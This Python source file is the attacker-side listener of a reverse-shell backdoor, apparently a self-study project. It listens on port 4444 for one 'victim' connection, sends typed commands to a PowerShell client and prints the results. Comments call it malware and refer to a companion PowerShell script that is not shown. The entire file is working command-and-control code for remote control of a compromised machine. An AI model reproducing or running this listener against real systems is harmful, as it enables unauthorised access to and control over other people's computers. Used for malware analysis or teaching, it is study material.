import socket

PORT = 4444

def start_listener() -> None:
    """
    Responsible for starting the listening process.
    Initializes a socket for the attacker, which is IPv4 Networking only
    Multiple Important Notes to be declared:
        1. IP: 0.0.0.0: Any Address: Listen on all Doors (Ethernet, WiFi, etc.)
                                     (Any IPv4)
        2. PORT: Port specified for connection, set equally in the powershell script
                 and in this script.
        3. Listens to ONLY ONE DEVICE: Which is exactly a sole connection 
           This type of malware is called formally a backdoor 
           'Resource: Practical Malware Analysis: Page 3'
           If multiple connections (multiple victims) => Botnet
    """
    attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    attacker_socket.bind(('0.0.0.0', PORT))
    attacker_socket.listen(1)

    print(f"Listening on port {PORT}...")
    connection, address = attacker_socket.accept()
    print(f"Connected to Victim: {address}")

    try:
        while True:
            
            # We first receive the prompt sent by the Client, which is his current working directory
            # We ensure (for any mistakes) that the decoding is standard 'utf-8'
            # We recieve a buffer size of 4096 (Idk I threw that out by multiplying by 1024)
            prompt_from_client = connection.recv(4096).decode("utf-8")
            if not prompt_from_client:
                break

            # Construct the command to send to powershell by using the cwd and the command the attacker
            # Types.
            command_to_send = input(prompt_from_client)

            # HERE: Sending just a command so both sides are ensured to be syncronized by default
            if not command_to_send.strip():
                connection.send(b"echo .")
                continue

            # A new line is ensured to be added so PowerShell Interpreter understands that this is EOL
            connection.send((command_to_send + "\n").encode())

            if command_to_send.lower() in ["exit", "quit"]:
                break

            """
            Why my recieving here is 16384 (Different than above)???
            That is mainly because PowerShell execution output sometimes is very large (we could end up
            executing very large outputs). For example, type 'dir' in a folder that has too many data, 
            and you will end up with a huge output. The number 2^14 = 16384 ensures enough space for some
            long commands outputs.
            """
            result = connection.recv(16384).decode("utf-8")
            print(result)

    # If any exception happened ...
    except Exception as exception_handle:
        print(f"\nError: {exception_handle}")
    finally:
        connection.close()
        attacker_socket.close()

# The entry point
if __name__ == '__main__':
    start_listener()